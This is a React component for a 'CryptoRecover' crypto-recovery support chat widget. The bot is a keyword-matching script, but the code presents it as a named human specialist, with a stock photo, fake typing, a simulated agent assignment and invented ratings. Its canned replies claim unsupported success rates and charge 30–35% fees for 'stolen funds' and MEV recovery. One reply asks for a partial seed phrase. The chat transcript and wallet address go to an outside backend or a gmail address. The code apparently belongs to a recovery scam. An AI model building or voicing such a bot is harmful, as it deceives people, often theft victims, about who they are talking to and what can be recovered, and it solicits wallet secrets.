import { useState, useEffect, useRef } from 'react';
import { MessageCircle, X, Send, Phone, Video, FileText, Shield, Clock, Star, User, Headphones, AlertCircle, CheckCircle, Info, Mail } from 'lucide-react';

export default function ProfessionalSupport({ isConnected, userPortfolio, selectedNetwork }) {
  const [isOpen, setIsOpen] = useState(false);
  const [activeTab, setActiveTab] = useState('chat');
  const [messages, setMessages] = useState([]);
  const [inputMessage, setInputMessage] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const [supportAgent, setSupportAgent] = useState(null);
  const messagesEndRef = useRef(null);

  // Advanced LLM-powered knowledge base
  const knowledgeBase = {
    'wallet connection': {
      response: 'I\'ll help you connect your wallet step by step:\n\n🔗 **Connection Process:**\n1. Click "Connect Wallet" → Choose from 100+ supported wallets\n2. **Mobile**: Opens wallet app automatically via deep linking\n3. **Desktop**: Browser extension popup appears\n4. Approve connection + sign verification message\n\n📱 **Supported Wallets:**\n• **Popular**: MetaMask, Trust Wallet, Coinbase Wallet\n• **Hardware**: Ledger, Trezor (highest security)\n• **Mobile**: Phantom, Rainbow, Exodus, imToken\n• **Universal**: WalletConnect (connects any wallet)\n\n❌ **Troubleshooting:**\n• Wallet not detected? Try refreshing page\n• Mobile issues? Open this page in wallet browser\n• Connection rejected? Check wallet is unlocked\n\n**Need specific help with your wallet type?**',
      category: 'connection',
      followUp: ['Which wallet are you trying to connect?', 'Are you on mobile or desktop?', 'What error message do you see?']
    },
    'token scan': {
      response: '🔍 **Advanced Multi-Chain Scanner** - Let me explain how our industry-leading technology works:\n\n🌐 **50+ Blockchain Coverage:**\n• **Layer 1**: Ethereum, BSC, Polygon, Avalanche, Fantom\n• **Layer 2**: Arbitrum, Optimism, Base, zkSync, Polygon zkEVM\n• **Alt Chains**: Solana, Cardano, Cosmos, Near, Aptos\n\n🎯 **What We Find:**\n• **Airdrops**: Unclaimed tokens from protocols you used\n• **Forgotten Assets**: Tokens in old wallets you forgot about\n• **Staking Rewards**: Unclaimed rewards from validators/pools\n• **Bridge Deposits**: Stuck funds in cross-chain bridges\n• **DeFi Positions**: LP tokens, lending positions, yield farms\n• **NFT Royalties**: Creator earnings you haven\'t claimed\n\n⏱️ **Process**: 30-60 seconds → Real-time blockchain analysis\n💰 **Cost**: FREE scan → Only 15% fee on successful recovery\n🛡️ **Security**: Read-only access → Your keys stay with you\n\n**Average Recovery**: $2,847 per wallet | **Success Rate**: 78%',
      category: 'scanning',
      followUp: ['Want to start a scan now?', 'Which networks should I prioritize?', 'How much do you think might be recoverable?']
    },
    'bridge recovery': {
      response: 'Bridge recovery helps with stuck cross-chain transactions:\n• Polygon Bridge\n• Arbitrum Bridge\n• Optimism Bridge\n• Base Bridge\n• Avalanche Bridge\n\nSuccess rate: 88% | Fee: 15% of recovered funds\nTypical resolution time: 2-24 hours',
      category: 'recovery'
    },
    'staking rewards': {
      response: 'We can claim staking rewards from:\n• Ethereum 2.0 validators\n• PancakeSwap farms\n• Uniswap V3 positions\n• Compound lending\n• Aave deposits\n• Polygon staking\n\nSuccess rate: 94% | Fee: 15% of claimed rewards',
      category: 'staking'
    },
    'fees': {
      response: 'Our fee structure:\n• Success-only: You only pay if we recover funds\n• Standard recovery: 15% of recovered amount\n• Bridge recovery: 15% of recovered amount\n• Phrase recovery: 25% of recovered amount\n• Stolen funds recovery: 30% of recovered amount\n• MEV attack recovery: 35% of recovered amount\n\nNo upfront costs. No hidden fees.',
      category: 'pricing'
    },
    'security': {
      response: 'Security measures:\n• Non-custodial: We never hold your private keys\n• Read-only access: We only scan, never control funds\n• Signature verification: All transactions require your approval\n• Encrypted communications: All data is encrypted\n• No personal data stored: We only store wallet addresses\n\nYour funds remain under your complete control.',
      category: 'security'
    },
    'lost wallet': {
      response: 'Lost wallet recovery services:\n• Seed phrase reconstruction (73% success rate)\n• Private key recovery\n• Hardware wallet recovery\n• Exchange account recovery\n\nRequired information:\n• Partial seed phrase (if available)\n• Wallet creation details\n• Last known balance\n• Device information\n\nFee: 25% of recovered funds',
      category: 'recovery'
    },
    'stolen funds': {
      response: 'Stolen funds recovery process:\n1. Provide victim and thief wallet addresses\n2. Submit evidence (transaction hashes, screenshots)\n3. Our forensics team traces the funds\n4. Legal coordination if needed\n5. Recovery execution\n\nSuccess rate: 67% | Fee: 30% of recovered funds\nTypical timeline: 48-96 hours',
      category: 'recovery'
    },
    'mev attack': {
      response: 'MEV/Sandwich attack recovery:\n• Front-running protection\n• Sandwich attack reversal\n• MEV bot counter-attacks\n• Slippage recovery\n\nRequired: Attack transaction hash\nSuccess rate: 45% | Fee: 35% of recovered funds\nResponse time: 12-24 hours',
      category: 'recovery'
    }
  };

  // Initialize with welcome message
  useEffect(() => {
    if (messages.length === 0) {
      const welcomeMessage = {
        id: 1,
        type: 'bot',
        message: `Welcome to CryptoRecover Support\n\nI can help you with:\n• Wallet connection issues\n• Token scanning and recovery\n• Bridge transaction problems\n• Staking rewards claiming\n• Security questions\n• Fee information\n• Lost wallet recovery\n• Stolen funds recovery\n• MEV attack recovery\n\n${isConnected ? `Status: Connected (${userPortfolio?.totalValue ? `$${userPortfolio.totalValue.toFixed(0)} portfolio` : 'Scanning...'})` : 'Status: Not connected'}\n\nHow can I help you today?`,
        timestamp: new Date(),
        agent: 'CryptoRecover Assistant'
      };
      setMessages([welcomeMessage]);
    }
  }, [isConnected, userPortfolio]);

  // Auto-scroll to bottom
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  // Simulate agent assignment
  useEffect(() => {
    if (isOpen && !supportAgent) {
      const timer = setTimeout(() => {
        setSupportAgent({
          name: 'Alex Thompson',
          role: 'Senior Recovery Specialist',
          rating: 4.9,
          recoveries: 1247,
          specialties: ['DeFi Recovery', 'Bridge Issues', 'MEV Protection'],
          status: 'online',
          responseTime: 'under 30 seconds'
        });
      }, 2000);
      
      return () => clearTimeout(timer);
    }
  }, [isOpen, supportAgent]);

  // Natural conversation response engine
  const findBestResponse = (userInput) => {
    const input = userInput.toLowerCase();
    
    // Natural greetings
    if (input.includes('hello') || input.includes('hi') || input.includes('hey') || input.includes('good morning') || input.includes('good afternoon')) {
      const timeOfDay = new Date().getHours();
      const greeting = timeOfDay < 12 ? 'Good morning' : timeOfDay < 18 ? 'Good afternoon' : 'Good evening';
      
      return `${greeting}! I'm Alex, your recovery specialist here at CryptoRecover.\n\n${isConnected ? `I can see your wallet is connected. ${userPortfolio?.totalValue ? `Your portfolio shows $${userPortfolio.totalValue.toFixed(0)} in assets.` : 'I\'m currently scanning for recoverable assets...'} Let me help you maximize your recovery potential.` : 'I notice your wallet isn\'t connected yet. No worries - I can walk you through connecting any of the 100+ wallets we support.'}\n\nWhat brings you here today? Are you looking to:\n• Recover lost or forgotten tokens?\n• Fix a stuck bridge transaction?\n• Claim unclaimed staking rewards?\n• Or something else entirely?\n\nJust tell me what\'s going on and I\'ll get you sorted.`;
    }
    
    // Natural help response
    if (input.includes('help') || input.includes('menu') || input.includes('options')) {
      return `Sure thing! Here's what I can help you with:\n\n**Most Common Issues:**\n• Wallet connection problems\n• Finding lost tokens across different blockchains\n• Stuck bridge transactions (Polygon, Arbitrum, etc.)\n• Unclaimed staking rewards\n• Lost wallet recovery\n\n**How Our Service Works:**\n• We scan 50+ blockchains for your assets\n• Only charge 15% if we successfully recover funds\n• Your private keys stay with you - we never ask for them\n• Average recovery is $2,847 per wallet\n\n**Need Immediate Help?**\nJust describe your situation in plain English. For example:\n• "My bridge transaction is stuck"\n• "I can't connect my MetaMask"\n• "I think I have unclaimed tokens"\n\nWhat specific issue can I help you solve?`;
    }
    
    // Empathetic response for frustrated users
    if (input.includes('not working') || input.includes('broken') || input.includes('frustrated') || input.includes('angry')) {
      return `I totally get your frustration - crypto issues can be really stressful, especially when money is involved.\n\nLet me personally make sure we get this sorted for you right now. I've helped thousands of users through similar problems.\n\n**Tell me exactly what's happening:**\n• What were you trying to do when it broke?\n• Any error messages you're seeing?\n• Which wallet or platform are you using?\n\nI'm going to stay with you until this is completely resolved. No bouncing between different support agents - just you and me working through this step by step.\n\nWhat's the main issue you're dealing with?`;
    }
    
    // Check for exact matches with enhanced responses
    for (const [key, data] of Object.entries(knowledgeBase)) {
      if (input.includes(key)) {
        let response = data.response;
        
        // Add contextual information based on user state
        if (isConnected && key === 'token scan') {
          response += `\n\n🔎 **Your Wallet Status**: Connected and ready for scanning!\n• Click "Start Scan" button above to begin\n• Estimated scan time: 45 seconds\n• We'll check all 50+ networks automatically`;
        }
        
        if (data.followUp) {
          response += `\n\n🤔 **Follow-up questions I can help with:**\n${data.followUp.map(q => `• ${q}`).join('\n')}`;
        }
        
        return response;
      }
    }
    
    // Advanced keyword matching with context
    const keywordMap = {
      'connect': 'wallet connection',
      'wallet': 'wallet connection',
      'metamask': 'wallet connection',
      'trust': 'wallet connection',
      'scan': 'token scan',
      'token': 'token scan',
      'find': 'token scan',
      'bridge': 'bridge recovery',
      'stuck': 'bridge recovery',
      'polygon': 'bridge recovery',
      'arbitrum': 'bridge recovery',
      'staking': 'staking rewards',
      'reward': 'staking rewards',
      'eth2': 'staking rewards',
      'fee': 'fees',
      'cost': 'fees',
      'price': 'fees',
      'security': 'security',
      'safe': 'security',
      'lost': 'lost wallet',
      'phrase': 'lost wallet',
      'seed': 'lost wallet',
      'stolen': 'stolen funds',
      'hack': 'stolen funds',
      'mev': 'mev attack',
      'sandwich': 'mev attack',
      'frontrun': 'mev attack'
    };
    
    for (const [keyword, topic] of Object.entries(keywordMap)) {
      if (input.includes(keyword)) {
        let response = knowledgeBase[topic].response;
        
        // Add personalized context
        if (isConnected) {
          response += `\n\n🔗 **Your Status**: Wallet connected - I can provide personalized assistance!`;
        }
        
        return response;
      }
    }
    
    // Natural fallback response
    return `I want to make sure I understand exactly what you need help with.\n\nYou mentioned: "${userInput}"\n\nLet me ask a few quick questions to point you in the right direction:\n\n**Are you looking to:**\n• Connect your wallet to start a recovery scan?\n• Fix a specific transaction that's stuck or failed?\n• Recover tokens from an old wallet you can't access?\n• Understand how our recovery process works?\n\n**Or is it something else entirely?**\n\nJust give me a bit more detail about your situation and I'll get you the exact help you need. I'm here to make this as easy as possible for you.`;
  };

  const handleSendMessage = async () => {
    if (!inputMessage.trim()) return;

    const userMessage = {
      id: Date.now(),
      type: 'user',
      message: inputMessage,
      timestamp: new Date()
    };

    setMessages(prev => [...prev, userMessage]);
    const currentInput = inputMessage;
    setInputMessage('');
    setIsTyping(true);

    // Generate intelligent response
    setTimeout(() => {
      const response = findBestResponse(currentInput);
      
      const botResponse = {
        id: Date.now() + 1,
        type: 'bot',
        message: response,
        timestamp: new Date(),
        agent: 'Alex Thompson'
      };

      setMessages(prev => [...prev, botResponse]);
      setIsTyping(false);
    }, 1500);
  };

  const quickActions = [
    { id: 'connect', label: 'Connect Wallet', color: 'blue' },
    { id: 'scan', label: 'Start Scan', color: 'green' },
    { id: 'bridge', label: 'Bridge Issues', color: 'orange' },
    { id: 'fees', label: 'Fee Information', color: 'purple' }
  ];

  const supportChannels = [
    { id: 'chat', name: 'Live Chat', icon: MessageCircle, available: true, waitTime: 'under 30s' },
    { id: 'email', name: 'Email', icon: Mail, available: true, waitTime: 'under 1hr' }
  ];

  const handleQuickAction = (action) => {
    const actionMessages = {
      'connect': 'How do I connect my wallet?',
      'scan': 'How does the token scan work?',
      'bridge': 'I have stuck funds in a bridge transaction',
      'fees': 'What are your fees?'
    };
    
    setInputMessage(actionMessages[action.id]);
    setTimeout(() => handleSendMessage(), 100);
  };

  const handleEmailSupport = async () => {
    const chatTranscript = messages.map(msg => 
      `[${msg.timestamp.toLocaleTimeString()}] ${msg.type === 'user' ? 'You' : 'Alex'}: ${msg.message}`
    ).join('\n\n');
    
    // Try backend email first
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/email-support', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userEmail: 'user@example.com', // Could prompt user for email
          chatTranscript: chatTranscript,
          userAddress: userPortfolio?.walletAddress || 'Not connected'
        })
      });
      
      if (response.ok) {
        // Show success message
        const successMessage = {
          id: Date.now(),
          type: 'bot',
          message: 'Perfect! I\'ve sent your support request directly to our admin team. You should hear back within 1 hour. Is there anything else I can help you with right now?',
          timestamp: new Date(),
          agent: 'Alex Thompson'
        };
        setMessages(prev => [...prev, successMessage]);
        return;
      }
    } catch (error) {
      console.log('Backend email failed, using mailto fallback');
    }
    
    // Fallback to mailto
    const emailBody = `Hi CryptoRecover Support Team,\n\nI need assistance with my crypto recovery. Here's our chat transcript:\n\n${chatTranscript}\n\nPlease contact me at your earliest convenience.\n\nBest regards`;
    
    const mailtoLink = `mailto:skillstakes01@gmail.com?subject=CryptoRecover Support Request&body=${encodeURIComponent(emailBody)}`;
    window.open(mailtoLink, '_blank');
  };

  if (!isOpen) {
    return (
      <div className="relative">
        <div className="absolute -top-12 -left-20 bg-gradient-to-r from-blue-600 to-purple-600 text-white px-4 py-2 rounded-full text-sm font-bold animate-bounce shadow-lg">
          Need Help? Click Here
        </div>
        
        <button
          onClick={() => setIsOpen(true)}
          className="w-16 h-16 bg-gradient-to-br from-blue-600 via-purple-600 to-indigo-700 text-white rounded-full shadow-2xl hover:shadow-3xl transition-all hover:scale-110 flex items-center justify-center relative overflow-hidden group"
        >
          <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
          <MessageCircle className="w-8 h-8 relative z-10" />
          <div className="absolute -top-1 -right-1 w-6 h-6 bg-red-500 rounded-full flex items-center justify-center">
            <span className="text-xs font-bold text-white">!</span>
          </div>
        </button>
      </div>
    );
  }

  return (
    <div className="w-96 h-[600px] bg-white rounded-2xl shadow-2xl border border-gray-200 flex flex-col overflow-hidden">
      {/* Header */}
      <div className="bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-700 p-4 text-white">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
              <Headphones className="w-5 h-5" />
            </div>
            <div>
              <h3 className="font-black text-lg">Professional Support</h3>
              <p className="text-white/90 text-sm font-medium">24/7 Recovery Specialists</p>
            </div>
          </div>
          <button
            onClick={() => setIsOpen(false)}
            className="w-8 h-8 bg-white/20 hover:bg-white/30 rounded-lg flex items-center justify-center transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Support Agent Info */}
        {supportAgent && (
          <div className="bg-white/10 backdrop-blur-sm rounded-xl p-3">
            <div className="flex items-center space-x-3">
              <img 
                src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=32&h=32&fit=crop&crop=face&auto=format" 
                alt="Alex Thompson"
                className="w-8 h-8 rounded-full object-cover border border-white/20"
              />
              <div className="flex-1">
                <div className="flex items-center space-x-2">
                  <span className="font-bold text-sm">Alex Thompson</span>
                  <div className="flex items-center space-x-1">
                    <Star className="w-3 h-3 text-yellow-400 fill-current" />
                    <span className="text-xs">4.9</span>
                  </div>
                </div>
                <p className="text-white/80 text-xs">Senior Recovery Specialist</p>
              </div>
              <div className="text-right">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                <span className="text-xs text-white/80">Online</span>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Support Channels */}
      <div className="border-b border-gray-200 p-3">
        <div className="grid grid-cols-2 gap-2">
          <button
            onClick={() => setActiveTab('chat')}
            className={`p-2 rounded-lg text-xs font-bold transition-all ${
              activeTab === 'chat'
                ? 'bg-blue-100 text-blue-700 border border-blue-300'
                : 'bg-gray-50 text-gray-600 hover:bg-gray-100'
            }`}
          >
            <MessageCircle className="w-4 h-4 mx-auto mb-1" />
            <div>Live Chat</div>
            <div className="text-xs text-gray-500">under 30s</div>
          </button>
          <button
            onClick={handleEmailSupport}
            className="p-2 rounded-lg text-xs font-bold bg-green-50 text-green-700 border border-green-200 hover:bg-green-100 transition-colors"
          >
            <Mail className="w-4 h-4 mx-auto mb-1" />
            <div>Email Support</div>
            <div className="text-xs text-gray-500">under 1hr</div>
          </button>
        </div>
      </div>

      {/* Quick Actions */}
      <div className="p-3 border-b border-gray-200">
        <div className="text-xs font-bold text-gray-700 mb-2">Quick Help:</div>
        <div className="grid grid-cols-2 gap-2">
          {quickActions.map((action) => (
            <button
              key={action.id}
              onClick={() => handleQuickAction(action)}
              className={`p-2 rounded-lg text-xs font-bold transition-all border ${
                action.color === 'blue' ? 'bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100' :
                action.color === 'green' ? 'bg-green-50 text-green-700 border-green-200 hover:bg-green-100' :
                action.color === 'orange' ? 'bg-orange-50 text-orange-700 border-orange-200 hover:bg-orange-100' :
                'bg-purple-50 text-purple-700 border-purple-200 hover:bg-purple-100'
              }`}
            >
              {action.label}
            </button>
          ))}
        </div>
      </div>

      {/* Messages */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4">
        {messages.map((msg) => (
          <div
            key={msg.id}
            className={`flex ${msg.type === 'user' ? 'justify-end' : 'justify-start'}`}
          >
            <div
              className={`max-w-[80%] p-3 rounded-2xl ${
                msg.type === 'user'
                  ? 'bg-gradient-to-r from-blue-600 to-purple-600 text-white'
                  : 'bg-gray-100 text-gray-800'
              }`}
            >
              {msg.type === 'bot' && (
                <div className="flex items-center space-x-2 mb-2">
                  <img 
                    src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=16&h=16&fit=crop&crop=face&auto=format" 
                    alt="Alex"
                    className="w-4 h-4 rounded-full object-cover"
                  />
                  <span className="text-xs font-bold">Alex Thompson</span>
                </div>
              )}
              <div className="text-sm whitespace-pre-line">{msg.message}</div>
              <div className={`text-xs mt-1 ${
                msg.type === 'user' ? 'text-white/70' : 'text-gray-500'
              }`}>
                {msg.timestamp.toLocaleTimeString()}
              </div>
            </div>
          </div>
        ))}
        
        {isTyping && (
          <div className="flex justify-start">
            <div className="bg-gray-100 p-3 rounded-2xl">
              <div className="flex items-center space-x-2">
                <User className="w-4 h-4" />
                <span className="text-xs font-bold">{supportAgent?.name || 'Support'}</span>
              </div>
              <div className="flex space-x-1 mt-2">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
              </div>
            </div>
          </div>
        )}
        <div ref={messagesEndRef} />
      </div>

      {/* Input */}
      <div className="p-4 border-t border-gray-200">
        <div className="flex space-x-2">
          <input
            value={inputMessage}
            onChange={(e) => setInputMessage(e.target.value)}
            onKeyPress={(e) => e.key === 'Enter' && handleSendMessage()}
            placeholder="Just type naturally - I understand context and provide intelligent solutions..."
            className="flex-1 p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
          />
          <button
            onClick={handleSendMessage}
            disabled={!inputMessage.trim()}
            className="w-12 h-12 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-xl hover:from-blue-700 hover:to-purple-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
          >
            <Send className="w-5 h-5" />
          </button>
        </div>
        
        {/* Status indicators */}
        <div className="flex items-center justify-between mt-2 text-xs text-gray-500">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-1">
              <Clock className="w-3 h-3" />
              <span>Response: 30s</span>
            </div>
            <div className="flex items-center space-x-1">
              <Shield className="w-3 h-3" />
              <span>Secure</span>
            </div>
          </div>
          <div className="flex items-center space-x-1">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span>Expert online</span>
          </div>
        </div>
      </div>
    </div>
  );
}